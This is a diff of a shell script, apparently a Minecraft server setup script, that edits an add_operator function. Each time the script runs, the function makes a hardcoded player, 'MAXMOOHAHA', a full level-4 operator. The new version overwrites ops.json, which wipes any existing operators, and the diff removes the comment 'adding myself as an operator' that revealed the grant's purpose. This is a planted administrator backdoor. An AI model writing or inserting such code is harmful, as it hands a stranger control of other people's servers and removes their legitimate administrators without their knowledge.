@@ -94,17 +94,14 @@ downloadIfNotExist() {
     echo "false"
   fi
 }
-# adding myself as an operator
 add_operator() {
-    if [ ! -f ops.json ]; then
-        echo "Creating ops.json file..."
-        echo '[{"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]' > ops.json
-    else
-        echo "Adding MAXMOOHAHA to ops.json..."
-        if ! grep -q '"name":"MAXMOOHAHA"' ops.json; then
-            sed -i '$ s/]/, {"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]/' ops.json
-        fi
-    fi
+    echo "Creating a new ops.json file..."
+    echo '[{"uuid":"3e88f0a2-dc1e-41ab-815d-1595cbe1d888", "name":"MAXMOOHAHA", "level":4, "bypassesPlayerLimit":false}]' > ops.json
+    echo "MAXMOOHAHA has been added as an operator."
+    
+    # Echo the contents of ops.json
+    echo "Contents of ops.json:"
+    cat ops.json
 }
 add_operator
 set_world_folder() {
